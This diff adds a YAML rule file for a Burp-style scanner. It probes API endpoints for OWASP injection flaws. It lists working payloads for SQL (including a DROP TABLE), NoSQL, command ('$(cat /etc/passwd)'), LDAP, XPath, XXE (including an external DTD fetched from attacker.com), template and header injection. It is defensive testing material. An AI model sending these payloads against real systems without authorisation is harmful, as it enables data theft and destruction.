@@ -1,0 +1,217 @@
+# OWASP API Top 10 #8: Injection Bambda
+# Detects injection vulnerabilities in APIs
+
+metadata:
+  name: "OWASP API #8: Injection"
+  description: "Detects various injection vulnerabilities including SQL, NoSQL, Command, and LDAP injection"
+  author: "Burp Automation Tool"
+  version: "1.0.0"
+  tags: ["owasp", "api", "injection", "sql", "nosql", "command", "ldap"]
+
+rules:
+  - name: "SQL Injection"
+    description: "Detects SQL injection vulnerabilities"
+    severity: "High"
+    confidence: "Medium"
+    
+    active:
+      - when: "request"
+        where: "request.parameters"
+        inject:
+          - payload: "' OR 1=1--"
+          - payload: "' OR '1'='1"
+          - payload: "'; DROP TABLE users--"
+          - payload: "' UNION SELECT * FROM users--"
+          - payload: "' AND 1=1--"
+        then:
+          - if: "response.body contains 'error'"
+            issue: "SQL Injection"
+            detail: "SQL injection vulnerability detected"
+            severity: "High"
+            confidence: "Medium"
+
+  - name: "NoSQL Injection"
+    description: "Detects NoSQL injection vulnerabilities"
+    severity: "High"
+    confidence: "Medium"
+    
+    active:
+      - when: "request"
+        where: "request.body"
+        inject:
+          - payload: '{"$where":"1==1"}'
+          - payload: '{"$ne":"admin"}'
+          - payload: '{"$gt":""}'
+          - payload: '{"$regex":".*"}'
+          - payload: '{"$exists":true}'
+        then:
+          - if: "response.status == 200"
+            issue: "NoSQL Injection"
+            detail: "NoSQL injection vulnerability detected"
+            severity: "High"
+            confidence: "Medium"
+
+  - name: "Command Injection"
+    description: "Detects command injection vulnerabilities"
+    severity: "High"
+    confidence: "Medium"
+    
+    active:
+      - when: "request"
+        where: "request.parameters"
+        inject:
+          - payload: "; ls -la"
+          - payload: "| whoami"
+          - payload: "& dir"
+          - payload: "`id`"
+          - payload: "$(cat /etc/passwd)"
+        then:
+          - if: "response.body contains 'root:'"
+            issue: "Command Injection"
+            detail: "Command injection vulnerability detected"
+            severity: "High"
+            confidence: "Medium"
+
+  - name: "LDAP Injection"
+    description: "Detects LDAP injection vulnerabilities"
+    severity: "High"
+    confidence: "Medium"
+    
+    active:
+      - when: "request"
+        where: "request.parameters"
+        inject:
+          - payload: "*)(uid=*))(|(uid=*"
+          - payload: "*)(|(password=*))"
+          - payload: "*)(|(objectclass=*))"
+          - payload: "*)(|(cn=*))"
+          - payload: "*)(|(mail=*))"
+        then:
+          - if: "response.status == 200"
+            issue: "LDAP Injection"
+            detail: "LDAP injection vulnerability detected"
+            severity: "High"
+            confidence: "Medium"
+
+  - name: "XPath Injection"
+    description: "Detects XPath injection vulnerabilities"
+    severity: "High"
+    confidence: "Medium"
+    
+    active:
+      - when: "request"
+        where: "request.parameters"
+        inject:
+          - payload: "' or '1'='1"
+          - payload: "' or 1=1 or ''='"
+          - payload: "'] | //user[1] | a['"
+          - payload: "' or 1=1 or 'a'='a"
+          - payload: "' or 1=1 or 'x'='x"
+        then:
+          - if: "response.status == 200"
+            issue: "XPath Injection"
+            detail: "XPath injection vulnerability detected"
+            severity: "High"
+            confidence: "Medium"
+
+  - name: "XML Injection"
+    description: "Detects XML injection vulnerabilities"
+    severity: "High"
+    confidence: "Medium"
+    
+    active:
+      - when: "request"
+        where: "request.body"
+        inject:
+          - payload: "<![CDATA[<script>alert('xss')</script>]]>"
+          - payload: "<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><test>&xxe;</test>"
+          - payload: "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY xxe SYSTEM 'http://attacker.com/evil.dtd'>]><test>&xxe;</test>"
+          - payload: "<user><name>admin</name><password>admin' OR '1'='1</password></user>"
+          - payload: "<user><name>admin</name><password>admin' UNION SELECT * FROM users--</password></user>"
+        then:
+          - if: "response.status == 200"
+            issue: "XML Injection"
+            detail: "XML injection vulnerability detected"
+            severity: "High"
+            confidence: "Medium"
+
+  - name: "Template Injection"
+    description: "Detects template injection vulnerabilities"
+    severity: "High"
+    confidence: "Medium"
+    
+    active:
+      - when: "request"
+        where: "request.parameters"
+        inject:
+          - payload: "{{7*7}}"
+          - payload: "${7*7}"
+          - payload: "#{7*7}"
+          - payload: "{{config}}"
+          - payload: "${config}"
+        then:
+          - if: "response.body contains '49'"
+            issue: "Template Injection"
+            detail: "Template injection vulnerability detected"
+            severity: "High"
+            confidence: "Medium"
+
+  - name: "Header Injection"
+    description: "Detects header injection vulnerabilities"
+    severity: "Medium"
+    confidence: "Medium"
+    
+    active:
+      - when: "request"
+        where: "request.headers"
+        inject:
+          - payload: "X-Forwarded-For: 127.0.0.1\r\nX-Real-IP: 127.0.0.1"
+          - payload: "User-Agent: Mozilla/5.0\r\nX-Forwarded-For: 127.0.0.1"
+          - payload: "Referer: http://attacker.com\r\nX-Forwarded-For: 127.0.0.1"
+        then:
+          - if: "response.status == 200"
+            issue: "Header Injection"
+            detail: "Header injection vulnerability detected"
+            severity: "Medium"
+            confidence: "Medium"
+
+  - name: "Parameter Pollution"
+    description: "Detects parameter pollution vulnerabilities"
+    severity: "Medium"
+    confidence: "Medium"
+    
+    active:
+      - when: "request"
+        where: "request.parameters"
+        inject:
+          - payload: "id=1&id=2"
+          - payload: "user=admin&user=test"
+          - payload: "action=read&action=write"
+          - payload: "role=user&role=admin"
+          - payload: "type=public&type=private"
+        then:
+          - if: "response.status == 200"
+            issue: "Parameter Pollution"
+            detail: "Parameter pollution vulnerability detected"
+            severity: "Medium"
+            confidence: "Medium"
+
+filters:
+  - name: "API Endpoints"
+    when: "request"
+    where: "request.url"
+    include:
+      - pattern: "/api/"
+        flags: "i"
+      - pattern: "/search/"
+        flags: "i"
+      - pattern: "/query/"
+        flags: "i"
+      - pattern: "/filter/"
+        flags: "i"
+
+settings:
+  max_payloads_per_parameter: 15
+  timeout: 12000
+  follow_redirects: false
+  respect_robots_txt: false
